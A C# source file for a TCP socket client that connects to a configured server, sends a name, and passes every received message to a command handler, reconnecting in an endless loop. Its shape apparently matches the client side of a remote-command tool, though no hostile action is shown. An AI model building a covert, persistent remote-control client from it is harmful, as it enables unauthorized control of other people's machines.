using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Client.Client
{
    public class SocketClient
    {
        public static bool
            bShouldRun = true,
            bNameSent = false;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }

        public bool SendASCII(string szCMD, bool sendEOF = true)
        {
            try
            {
                string finalCMD = szCMD;
                if (sendEOF)
                    finalCMD += "<EOF>";
                serverSocket.Send(Encoding.ASCII.GetBytes(finalCMD));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
            return true;
        }

        public void ExecuteClient()
        {
            while (bShouldRun)
            {
                try
                {
                    // Connect to server

                    IPAddress ipAddress;
                    if (User.Config.szIPAddress == "0")
                    {
                        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                        ipAddress = ipHost.AddressList[0];
                    }
                    else
                    {
                        ipAddress = IPAddress.Parse(User.Config.szIPAddress);
                    }

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    // Connect to server.
                    IPEndPoint localEndPoint = new(ipAddress, User.Config.iPortNumber);
                    GetServerSocket().Connect(localEndPoint);

                    if (!bNameSent)
                        bNameSent = CommandHandler.SendName();

                    try
                    {
                        while (GetServerSocket().Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[User.Config.iSocketBuffer];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            CommandHandler.ParseData(Encoding.ASCII.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                    if (!GetServerSocket().Connected)
                        bNameSent = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }
    }
}
